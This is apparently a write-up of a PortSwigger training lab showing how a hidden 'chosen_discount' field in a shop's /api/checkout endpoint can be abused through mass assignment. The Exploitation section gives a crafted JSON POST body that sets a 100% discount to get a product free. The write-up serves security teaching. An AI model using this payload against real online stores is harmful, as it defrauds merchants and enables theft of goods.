# Exploiting a mass assignment vulnerability

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability), you'll learn: Exploiting a mass assignment vulnerability! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

To solve the lab, find and exploit a mass assignment vulnerability to buy a **Lightweight l33t Leather Jacket**. You can log in to your own account using the following credentials: `wiener:peter`.

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510164125.png)

In here, we can purchase some products.

Let's login as user `wiener`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510164225.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510164232.png)

After playing around at the web application, an API endpoint can be discovered.

First, go to a product's detail page by clicking the "View details" button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510164639.png)

Then, add the product into our cart:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510164736.png)

Next, go to our cart:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510164757.png)

In here, we can view the page source by hitting Ctrl + U, and we should see the following HTML elements:

```html
[...]
<script type='text/javascript'>
    const getApiEndpoint = () => '/api/checkout';
    const buildProductRow = (id, name, price, quantity) => `        <tr>
<td>
    <a href=/product?productId=${encodeURIComponent(id)}>${name}</a>
</td>
<td>${price}</td>
<td>
    <form action=/cart method=POST style='display: inline'>
        <input required type=hidden name=productId value=${encodeURIComponent(id)}>
        <input required type=hidden name=quantity value=-1>
        <input required type=hidden name=redir value=CART>
        <button type=submit class=button style='min-width: auto'>-</button>
    </form>
    ${quantity}
    <form action=/cart method=POST style='display: inline'>
        <input required type=hidden name=productId value=${encodeURIComponent(id)}>
        <input required type=hidden name=quantity value=1>
        <input required type=hidden name=redir value=CART>
        <button type=submit class=button style='min-width: auto'>+</button>
    </form>
</td>
<td>
    <form action=/cart method=POST style='display: inline'>
        <input required type=hidden name=productId value=${encodeURIComponent(id)}>
        <input required type=hidden name=quantity value=-${quantity}>
        <input required type=hidden name=redir value=CART>
        <button type=submit class=button style='min-width: auto'>Remove</button>
    </form>
</td>
</tr>
        `;
</script>
<script type='text/javascript' src='/resources/js/api/checkout.js'></script>
[...]
```

**In the inline JavaScript code, we can see that an API endpoint is at `/api/checkout`:**
```javascript
const getApiEndpoint = () => '/api/checkout';
```

**In the loaded JavaScript file at `/resources/js/api/checkout.js`, we can see the API endpoint has 2 methods, `GET` and `POST`:**
```javascript
[...]
const doLoadCart = () => {
    fetch(
        getApiEndpoint(),
        {
            method: 'GET'
        }
    )
        .then(res => res.json())
        .then(order => { cachedOrder = getProductIdsAndQuantitiesFromOrder(order); loadOrder(order); });
}

const doCheckout = (event) => {
    event.preventDefault();

    if (cachedOrder == null) {
        throw new Error("No cached order found!");
    }

    fetch(
        getApiEndpoint(),
        {
            method: 'POST',
            body: JSON.stringify(cachedOrder)
        }
    )
        .then(res => res.headers.get("Location"))
        .then(loc => window.location = loc);
};

window.onload = () => {
    doLoadCart();
}
```

When the `window` JavaScript object is loaded, it'll get the user's cart details.

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510165751.png)

**We can also see the GET request to `/api/checkout`'s respond when we go to our cart, which has this JSON data:**
```json
{
    "chosen_discount":
    {
        "percentage": 0
    },
    "chosen_products":
    [
        {
            "product_id": "1",
            "name": "Lightweight \"l33t\" Leather Jacket",
            "quantity": 1,
            "item_price": 133700
        }
    ]
}
```

In the above JSON data, we can see there's a **`chosen_discount` parameter**. In our cart page, it didn't show that to us:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510170321.png)

**Also, when we trying to place an order, it sends this POST request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510171201.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510171215.png)

As you can see, there's no **`chosen_discount` parameter** when we clicked the "Place order" button.

With the above information, we know that there's an API endpoint at `/api/checkout`. We can try to access the base path of the API endpoint (`/api/`) to get the documentation of this API:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510170446.png)

As expected, it has 1 API endpoint with 2 methods.

In the GET method, it return the entire `Order` object:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510170839.png)

In the POST method, **we can also provide the entire `Order` object**??

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510170915.png)

## Exploitation

Hmm... Maybe we can **apply a non-existence discount via exploiting the mass assignment vulnerability**?

Mass assignment (also known as auto-binding) can inadvertently create hidden parameters. It occurs when software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer.

**Armed with the above information, we can construct the following JSON data for the place order POST request:**
```json
{
    "chosen_discount":
    {
        "percentage": 100
    },
    "chosen_products":
    [
        {
            "product_id": "1",
            "quantity": 1
        }
    ]
}
```

By doing so, we apply our non-existence 100% off discount on the product, thus the product is free buy!

**Let's send this data to the API endpoint `/api/checkout` with POST method!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510171636.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-3/images/Pasted%20image%2020240510171643.png)

Nice! We bought the product for free!

## Conclusion

What we've learned:

1. Exploiting a mass assignment vulnerability